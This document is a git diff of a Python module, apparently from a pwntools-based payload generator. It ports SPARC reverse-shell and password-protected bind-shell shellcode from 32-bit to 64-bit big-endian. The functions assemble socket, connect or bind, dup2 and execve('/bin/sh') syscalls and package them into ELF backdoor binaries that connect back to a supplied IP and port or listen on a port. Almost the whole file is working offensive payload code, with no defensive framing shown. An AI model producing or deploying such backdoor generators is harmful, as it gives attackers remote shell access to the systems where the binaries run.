@@ -1,42 +1,43 @@
 from pwn import *
 '''
 11.17 add sparc32 ,powerpc don't exam
-socket 0xce like x86
-connect 0xce like x86
+socket 0xce
+connect 0x62
 dup2  0x5A
 execve  0x3B
-read 3
-write 4
-macbook make_elf in linux run
+bind
+listen
+add 11.24 sparc64_big_backdoor
 '''
 from colorama import Fore,Back,Style
 from . import extract_shellcode
 from . import my_package
 
-def sparc_backdoor(reverse_ip, reverse_port, filename = None):
-    context.arch = 'sparc'
+def sparc64_backdoor(reverse_ip ,reverse_port, filename = None):
+    context.arch = 'sparc64'
     context.endian = 'big'
-    context.bits = '32'
+    context.bits = '64'
     log.success("reverse_ip is: "+ reverse_ip)
     log.success("reverse_port is: "+str(reverse_port))
     reverse_ip = reverse_ip.split('.')
-
     reverse_ip_1 = "0x"+enhex(p8(int(reverse_ip[0])))
     reverse_ip_2 = "0x"+enhex(p8(int(reverse_ip[1])))
     reverse_ip_3 = "0x"+enhex(p8(int(reverse_ip[2])))
     reverse_ip_4 = "0x"+enhex(p8(int(reverse_ip[3])))
     handle_port = hex(p16(reverse_port)[0])
     handle_port_1 = hex(p16(reverse_port)[1])
-    #print(reverse_ip)
     shellcode = '''
     mov  0, %o2
     mov  1, %o1
     mov  2, %o0
-    save %sp, -0x70, %sp
-    mov  1, %o0
-    st   %i0, [%fp+-0xc]
-    add  %fp, -0xc, %o1
-    st   %i1, [%fp+-8]
+    save   %sp,  -208,  %sp
+    stx    %g1,  [ %fp + 0x7f7 ]
+    clr    %g1
+    mov    1,  %o0
+    stx    %i0,  [ %fp + 0x7df ]
+    stx    %i1,  [ %fp + 0x7e7 ]
+    stx    %i2,  [ %fp + 0x7ef ]
+    add    %fp,  0x7df,  %o1
     mov  0xce, %g1
     ta   0x10
     mov  %o0, %l0
@@ -56,14 +57,9 @@ def sparc_backdoor(reverse_ip, reverse_port, filename = None):
     stb   %g1,  [%sp + 2]
     mov   {}, %g1
     stb   %g1,  [%sp + 3]
-    mov  0x10, %g1
-    st   %g1, [%sp + -8 ]
-    st   %sp,  [%sp + -12]
-    st   %o0,  [%sp + -16]
-    mov  3,  %o0
-    add  %sp, -16, %o1
-    mov  0,   %o2
-    mov  0xce, %g1
+    mov  %sp, %o1
+    mov  0x10,%o2
+    mov  0x62,%g1
     ta   0x10
     mov  %l0, %o0
     mov  0,  %o1
@@ -85,8 +81,8 @@ def sparc_backdoor(reverse_ip, reverse_port, filename = None):
     mov  0,  %g3
     add  %sp, 0x20, %g1
     mov  %g1, %o0
-    st   %g1, [%sp]
-    st   %g3, [%sp +4]
+    stx   %g1, [%sp]
+    stx   %g3, [%sp +8]
     mov  %sp, %o1
     mov  %g3, %o2
     mov  0x3b, %g1
@@ -135,35 +131,26 @@ def sparc_backdoor(reverse_ip, reverse_port, filename = None):
             else:
                 return  
 
-
-def sparcle_backdoor(reverse_ip, reverse_port, filename = None):
-    context.arch = 'sparc'
-    context.endian = 'little'
-    context.bits = '32'
-    log.success("reverse_ip is: "+ reverse_ip)
-    log.success("reverse_port is: "+str(reverse_port))
-
-
-    
 '''
-11.17 add sparc32 ,powerpc don't exam
-socket 0xce like x86
-bind  0xce
-listen 0xce
+12.18 sparc64 bind shell
+socket 0xce
+connect 0x62
 dup2  0x5A
 execve  0x3B
-accept  0x143
-macbook make_elf in linux run
+bind
+listen
+add 11.24 sparc64_big_backdoor
 '''
 
-def sparc_bind_shell(listen_port, passwd, filename= None):
-    context.arch = 'sparc'
+
+def sparc64_bind_shell(bindport, passwd, filename=None):
+    context.arch = 'sparc64'
     context.endian = 'big'
-    context.bits = '32'
-    log.success("bind port is set to "+ str(listen_port))
-    log.success("passwd is set to '%s'"%passwd )
-    handle_port = hex(p16(listen_port)[0])
-    handle_port_1 = hex(p16(listen_port)[1])
+    context.bits = '64'
+    log.success("bind_port is: "+ str(bindport))
+    log.success("reverse_port is: "+str(passwd))
+    handle_port = hex(p16(bindport)[0])
+    handle_port_1 = hex(p16(bindport)[1])
     passwd_len = len(passwd)
     passwd = '0x'+enhex(passwd.encode())
     passwd = passwd.ljust(10,'0')
@@ -171,11 +158,14 @@ def sparc_bind_shell(listen_port, passwd, filename= None):
     mov  0, %o2
     mov  1, %o1
     mov  2, %o0
-    save %sp, -0x70, %sp
-    mov  1, %o0
-    st   %i0, [%fp+-0xc]
-    add  %fp, -0xc, %o1
-    st   %i1, [%fp+-8]
+    save   %sp,  -208,  %sp
+    stx    %g1,  [ %fp + 0x7f7 ]
+    clr    %g1
+    mov    1,  %o0
+    stx    %i0,  [ %fp + 0x7df ]
+    stx    %i1,  [ %fp + 0x7e7 ]
+    stx    %i2,  [ %fp + 0x7ef ]
+    add    %fp,  0x7df,  %o1
     mov  0xce, %g1
     ta   0x10
     mov  %o0, %l0
@@ -189,31 +179,29 @@ def sparc_bind_shell(listen_port, passwd, filename= None):
     stb   %g1,  [%sp + 2]
     mov   {}, %g1
     stb   %g1,  [%sp + 3]
-    mov  0x10, %g1
-    st   %g1, [%sp + -8 ]
-    st   %sp,  [%sp + -12]
-    st   %o0,  [%sp + -16]
-    mov  2,  %o0
-    add  %sp, -16, %o1
-    mov  0,   %o2
-    mov  0xce, %g1
+    mov  %sp, %o1
+    mov  0x10, %o2
+    stx   %o0,   [%sp-0x38]
+    stx   %o1,  [%sp-0x30]
+    stx   %o2,  [%sp-0x28]
+    sub  %o1, 0x38, %o1    
+    mov  2,%o0
+    mov  0xce,%g1
     ta   0x10
-    mov  %l0, %o0
-    st   %o0, [%sp + 32]
-    mov  0,   %g1
-    st   %g1, [%sp + 36]
-    add  %sp, 32, %o1
-    mov  0xce, %g1
-    mov  4,%o0
-    mov  0,%o3
-    mov  3,%o4
+    mov  0,  %o2
+    stx  %o2,   [%sp-0x30]
+    stx  %o2,   [%sp-0x28]
+    mov  0,  %o3
+    mov  3,  %o4
+    mov  4,   %o0
     ta   0x10
+    mov  0x63, %g1
     mov  %l0, %o0
-    mov  0, %o1
+    mov  0,  %o1
     mov  0, %o2
-    mov  0x143, %g1
-    ta   0x10
+    ta  0x10
     mov  %o0, %l0
+    mov  %l0, %o0
     mov  0,  %o1
     mov  0x5a, %g1
     ta   0x10
@@ -242,7 +230,8 @@ def sparc_bind_shell(listen_port, passwd, filename= None):
     ld   [%sp +88], %o7
     cmp  %o7, %l4
     '''
-    shellcode_exec = '''
+
+    shellcode_execve = '''
     sethi  0xbd89a, %g2
     or     %g2, 0x16e, %g2
     sethi  %hi(0x2f736800), %g3
@@ -251,17 +240,16 @@ def sparc_bind_shell(listen_port, passwd, filename= None):
     mov  0,  %g3
     add  %sp, 0x20, %g1
     mov  %g1, %o0
-    st   %g1, [%sp]
-    st   %g3, [%sp +4]
+    stx   %g1, [%sp]
+    stx   %g3, [%sp +8]
     mov  %sp, %o1
     mov  %g3, %o2
     mov  0x3b, %g1
     ta   0x10
     '''
-    #print(handle_port)
     shellcode = asm(shellcode.format(handle_port, handle_port_1, passwd_len, passwd))
-    shellcode += b'\x12\x80\x10\x06\x01\x00\x00\x00'
-    shellcode += asm(shellcode_exec)
+    shellcode += b'\x12\x68\x00\x06\x01\x00\x00\x00'
+    shellcode += asm(shellcode_execve)
     ELF_data = make_elf(shellcode)
     if(filename==None):
         log.info("waiting 3s")
@@ -303,3 +291,7 @@ def sparc_bind_shell(listen_port, passwd, filename= None):
                 context.endian="little"
             else:
                 return  
+
+
+def sparc64_reverse_sl(reverse_ip, reverse_port, filename = None):
+    pass
